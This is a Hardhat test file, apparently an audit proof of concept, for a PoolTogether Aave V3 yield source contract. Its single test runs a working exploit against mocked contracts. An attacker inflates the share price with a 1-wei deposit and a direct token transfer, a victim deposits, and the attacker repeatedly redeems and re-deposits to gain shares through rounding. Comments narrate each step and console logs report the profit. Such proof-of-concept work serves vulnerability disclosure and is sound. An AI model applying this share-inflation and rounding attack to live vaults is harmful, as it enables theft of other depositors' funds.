import { Signer } from '@ethersproject/abstract-signer';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

import { expect } from 'chai';
import { BigNumber } from 'ethers';
import { MockContract } from 'ethereum-waffle';
import { network, ethers, waffle } from 'hardhat';

import {
  AaveV3YieldSourceHarness,
  AaveV3YieldSourceHarness__factory,
  ATokenSimulator,
  ERC20Mintable,
  PoolSimulator
} from '../types';

import IAToken from '../abis/IAToken.json';
import IRewardsController from '../abis/IRewardsController.json';
import IPool from '../abis/IPool.json';
import IPoolAddressesProvider from '../abis/IPoolAddressesProvider.json';
import IPoolAddressesProviderRegistry from '../abis/IPoolAddressesProviderRegistry.json';
import SafeERC20Wrapper from '../abis/SafeERC20Wrapper.json';

const { constants, getContractFactory, getSigners, utils } = ethers;
const { AddressZero, MaxUint256 } = constants;
const { parseEther: toWei, parseUnits } = utils;

const DECIMALS = 6;
const REFERRAL_CODE = 188;

describe('AaveV3YieldSource', () => {
  let contractsOwner: Signer;
  let yieldSourceOwner: SignerWithAddress;
  let wallet2: SignerWithAddress;
  let attacker: SignerWithAddress;

  let rewardsController: MockContract;
  let pool: PoolSimulator;
  let poolAddressesProvider: MockContract;
  let poolAddressesProviderRegistry: MockContract;

  let aaveV3YieldSource: AaveV3YieldSourceHarness;

  let usdcToken: ERC20Mintable;
  let aToken: ATokenSimulator;

  let constructorTest = false;

  const deployAaveV3YieldSource = async (
    aTokenAddress: string,
    rewardsControllerAddress: string,
    poolAddressesProviderRegistryAddress: string,
    decimals: number,
    owner: string,
  ): Promise<AaveV3YieldSourceHarness> => {
    const AaveV3YieldSource = (await ethers.getContractFactory(
      'AaveV3YieldSourceHarness',
    )) as AaveV3YieldSourceHarness__factory;

    return await AaveV3YieldSource.deploy(
      aTokenAddress,
      rewardsControllerAddress,
      poolAddressesProviderRegistryAddress,
      'PoolTogether aUSDC Yield',
      'PTaUSDCY',
      decimals,
      owner,
    );
  };

  beforeEach(async () => {
    const { deployMockContract } = waffle;

    [contractsOwner, yieldSourceOwner, wallet2, attacker] = await getSigners();

    const ERC20MintableContract = await getContractFactory('ERC20Mintable', contractsOwner);

    usdcToken = (await ERC20MintableContract.deploy('USD Coin', 'USDC', 6)) as ERC20Mintable;

    const aTokenSimulator = await getContractFactory('aTokenSimulator', contractsOwner);

    //Deploy my own aToken
    aToken = (await aTokenSimulator.deploy('aToken', 'aToken', 18, usdcToken.address)) as ATokenSimulator;

    const PoolSimulator = await getContractFactory('PoolSimulator', contractsOwner);

    pool = (await PoolSimulator.deploy(usdcToken.address, aToken.address)) as PoolSimulator;

    //Start pool off with a bunch of tokens (I am cheating)
    await usdcToken.mint(pool.address, BigNumber.from(10).pow(60));
    await aToken.mint(pool.address, BigNumber.from(10).pow(60));

    rewardsController = await deployMockContract(contractsOwner, IRewardsController);

    poolAddressesProvider = await deployMockContract(contractsOwner, IPoolAddressesProvider);

    poolAddressesProviderRegistry = await deployMockContract(
      contractsOwner,
      IPoolAddressesProviderRegistry,
    );

    await poolAddressesProvider.mock.getPool.returns(pool.address);
    await poolAddressesProviderRegistry.mock.getAddressesProvidersList.returns([
      poolAddressesProvider.address,
    ]);

    aaveV3YieldSource = await deployAaveV3YieldSource(
      aToken.address,
      rewardsController.address,
      poolAddressesProviderRegistry.address,
      DECIMALS,
      yieldSourceOwner.address,
    );

    await aToken.forciblySetApproval(aaveV3YieldSource.address, pool.address, MaxUint256)

  });

  describe('PoolTogether vulnerabilities', () => {

    //For this test I assume USDC has 18 decimals rather than 6. I'm pretty sure it works either way; just making it easier on myself.
    it.only('allows easy pool draining if an early depositor ramps up the share price, then rug pulls', async () => {
      const USDC_DECIMALS = 18;
      console.log('Current vault shares: ', (await aaveV3YieldSource.totalSupply()).toString())
      console.log('Current vault token balance: ', (await usdcToken.balanceOf(aaveV3YieldSource.address)).toString())
      //Mint 1 share to attacker for 1 wei
      const ATTACKER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(10000)
      await usdcToken.connect(attacker).approve(aaveV3YieldSource.address, MaxUint256)
      await usdcToken.mint(attacker.address, ATTACKER_STARTING_BAL)  //Attacker starts with 10,000 USDC (well, not usdc due to decimals, but most other coins)
      await aaveV3YieldSource.connect(attacker).supplyTokenTo(1, attacker.address);

      //Attacker transfers in 1000 tokens to ramp share value up to 10^21 tokens / share
      await usdcToken.connect(attacker).approve(pool.address, MaxUint256)
      await pool.connect(attacker).supply(usdcToken.address, BigNumber.from(10).pow(USDC_DECIMALS), aaveV3YieldSource.address, 4)
      await usdcToken.connect(attacker).transfer(aaveV3YieldSource.address, BigNumber.from(10).pow(USDC_DECIMALS).mul(1000));

      console.log('Vault shares post-deposit and transfer: ', (await aaveV3YieldSource.totalSupply()).toString())
      console.log('Vault token balance: ', (await usdcToken.balanceOf(aaveV3YieldSource.address)).toString())
      console.log('Vault aToken balance: ', (await aToken.balanceOf(aaveV3YieldSource.address)).toString())
      console.log('Tokens / share: ', (await aaveV3YieldSource.sharesToToken(1)).toString())
      console.log('Shares / token: ', (await aaveV3YieldSource.tokenToShares(1)).toString())

      //Now some poor sap deposits 100,000 USDC
      const USER_STARTING_BAL = BigNumber.from(10).pow(USDC_DECIMALS).mul(100000)
      await usdcToken.mint(wallet2.address, USER_STARTING_BAL)
      await usdcToken.connect(wallet2).approve(aaveV3YieldSource.address, MaxUint256)
      console.log('145')
      await aaveV3YieldSource.connect(wallet2).supplyTokenTo(USER_STARTING_BAL, wallet2.address)
      console.log('147')

      console.log('New vault shares after sucker has deposited: ', (await aaveV3YieldSource.totalSupply()).toString())
      console.log('New vault token balance: ', (await usdcToken.balanceOf(aaveV3YieldSource.address)).toString())
      console.log('Tokens / share: ', (await aaveV3YieldSource.sharesToToken(1)).toString())

      //Now at this point I need to call withdraw over and over. If a share is worth 1000 tokens, I redeem 1999 tokens and burn 1 share, then deposit it back and repeat.

      let preExploitAttackerBalance = await usdcToken.balanceOf(attacker.address)
      let preExploitAttackerShares = await aaveV3YieldSource.balanceOf(attacker.address)

      for (let i = 0; i < 10; i++)   {
        //Burn almost 2 shares' worth
        console.log('160')
        let currentShareValue = await aaveV3YieldSource.sharesToToken(1)
        let amountToBurn = currentShareValue.mul(2).sub(1)
        console.log('165')
        await aaveV3YieldSource.connect(attacker).redeemToken(amountToBurn)

        console.log('168')
        //Deposit 2 shares' worth
        await aaveV3YieldSource.connect(attacker).supplyTokenTo(amountToBurn.add(1), attacker.address)
      }

      //At the end, the attacker should have very slightly less usdc token, but 10 more shares
      let postExploitAttackerBalance = await usdcToken.balanceOf(attacker.address)
      let postExploitAttackerShares = await aaveV3YieldSource.balanceOf(attacker.address)
      console.log('Exploit bal cost USDC: ', (preExploitAttackerBalance.sub(postExploitAttackerBalance)).toString())
      console.log('Exploit share gain in shares: ', (postExploitAttackerShares.sub(preExploitAttackerShares)).toString())
    })
  })
})